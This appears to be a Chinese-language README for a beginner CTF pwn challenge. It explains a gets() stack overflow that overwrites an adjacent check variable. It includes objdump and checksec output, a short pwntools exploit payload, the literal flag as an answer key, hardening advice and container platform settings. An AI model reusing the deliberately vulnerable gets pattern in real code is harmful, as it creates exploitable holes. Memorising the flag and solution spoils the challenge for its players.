# pwn-stack-check

## 一、题目与考点

| 项 | 值 |
|---|---|
| 难度 | 易 |
| 考点 | 栈溢出覆盖相邻局部变量；`gets` 无长度检查；栈帧布局 |
| 容器端口 | 宿主机 9101 → 容器 1337 |
| Flag | `flag{stack_overflow_overwrite_the_check_var}` |

## 题面（直接复制到平台「简介」）

一个内部的口令校验小工具被留在了靶机上，只保留了网络入口，没有源码。用 `nc <地址> 9101` 连上去，它会先问口令，答错就结束。目标：让它认为口令正确，从而把 flag 打印出来。

**提示**：`objdump -d` 能看出它把你的输入读进了哪一段栈空间，以及紧挨着的是哪个变量。

## 二、题目描述

```
nc <host> 9101
Tell me the password:
```

`main` 里有两个相邻的局部变量：

```c
char check[8] = "Nope";
char buf[32];
gets(buf);
if (memcmp(check, "YourFlag", 8) == 0) { ... print /app/flag ... }
```

`gets` 不检查长度。把 `check` 覆盖成 `YourFlag` 就能进入打印分支。

## 三、解题步骤

1. 看保护：

```bash
checksec --file=files/pwn
# Partial RELRO | No canary | NX enabled | No PIE (0x400000) | Not stripped
```

2. 看栈布局：

```bash
objdump -d files/pwn | sed -n '/<main>:/,/ret/p'
```

关键两行：

```asm
4012df: lea    rax,[rbp-0x30]        # buf
4012aa: mov    QWORD PTR [rbp-0x8],0x65706f4e   # check = "Nope"
4012eb: lea    rax,[rbp-0x8]         # memcmp(check, ...)
```

`buf` 在 `rbp-0x30`，`check` 在 `rbp-0x8`，距离 `0x30-0x8 = 0x28 = 40` 字节。
`buf` 本身只有 32 字节，中间 8 字节是编译器留的对齐空洞。

3. 构造输入：40 个填充字节 + `YourFlag`。

4. 跑 exp：

```bash
python3 exp/exp.py            # 默认 127.0.0.1:9101
HOST=<题目地址> PORT=9101 python3 exp/exp.py
```

输出：

```
Correct!
flag{...}
```

exp 核心三行：

```python
p.recvuntil(b'password:')
p.sendline(b'A' * 40 + b'YourFlag')
print(p.recvall(timeout=3))
```

## 四、原理

x86-64 的栈帧从高地址往低地址生长。函数入口 `push rbp; mov rbp, rsp; sub rsp, N` 之后，
所有局部变量都在 `[rbp-N, rbp)` 区间内，编译器按声明顺序和对齐规则排布。

`gets(buf)` 一直读到换行为止，写入字节数不受 `buf` 大小限制，写超出的部分按地址递增覆盖后面的局部变量。
本例里紧跟着的是 `check`，于是 `check` 的内容变成我们写入的第 41~48 字节。

`memcmp(check, "YourFlag", 8)` 只看这 8 个字节，因此不需要改返回地址、不需要 ROP，
直接改数据即可改控制流。

## 五、防御建议

- 用 `fgets(buf, sizeof buf, stdin)` 或 `read(0, buf, sizeof buf)` 替代 `gets`。
  编译时加 `-Werror=implicit-function-declaration` 可以让 `gets` 直接编不过。
- 开启 `-fstack-protector-all`：本例覆盖的是普通局部变量，canary 在 `rbp-8` 之上，
  仍会被检测到（`check` 与 canary 之间的溢出会破坏 canary）。
- 打开 PIE（`-fPIE -pie`）提高利用门槛。
- 用 `-D_FORTIFY_SOURCE=2` 编译，`gets` 类调用会被 `__gets_chk` 拦住，前提是长度可静态推导。

## 六、附件清单

| 文件 | 说明 |
|---|---|
| `files/pwn` | 与容器内 `/app/pwn` 完全一致的二进制（ELF64 PIE 关闭） |
| `src/pwn.c` | 源码 |
| `exp/exp.py` | pwntools 利用脚本 |
| `Dockerfile` / `entrypoint.sh` / `docker-compose.yml` | 容器构建与编排 |
| `checker/main.rx` | 平台判题脚本（dynamic-uuid 模板） |

二进制保护（`checksec`）：

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

关键符号：`main = 0x40129e`，`buf = rbp-0x30`，`check = rbp-0x8`，覆盖距离 40 字节。

---

## 平台镜像配置（添加镜像时照这张表填）

| 字段 | 填什么 | 说明 |
|---|---|---|
| 容器名称 | `pwn-stack-check` | 与题目目录名、tar 文件名保持一致 |
| 镜像标签 | `<registry>/<bucket>/pwn-stack-check` | 仓库名取自 tar 文件名（去扩展名），上传后 UI 自动带出 |
| 镜像版本 | 上传后生成的 Unix 时间戳 | 下拉选最新那条，不要手填 |
| 镜像拉取策略 | `Always` | 与平台默认一致 |
| 服务描述 | Pwn/交互题（nc 连上去打） | 只是备注，不影响运行 |
| 传输协议 | `tcp` | 全库只有 TCP 服务 |
| 应用协议 | `raw` | 裸 TCP / SSH / socat 选 raw |
| **服务端口** | **`1337`** | 容器内实际监听端口，必须与 Dockerfile 的 `EXPOSE` 一致 |
| CPU 限制 | `0.1, 0.3` | 最小, 最大（核） |
| 内存限制（MB） | `64, 128` | 最小, 最大 |
| 存储限制（MB） | `64, 1024` | 最小, 最大 |
| restricted | **勾选** | 平台会 drop `NET_BIND_SERVICE`，所以容器监听的是 `1337` 而不是 80 |
| 出网 | **关闭** | 本题不需要外网 |

> 端口必须填 **1337**。这是 socat / 裸 TCP 服务的监听端口，选手用 `nc <地址> <映射端口>` 连。
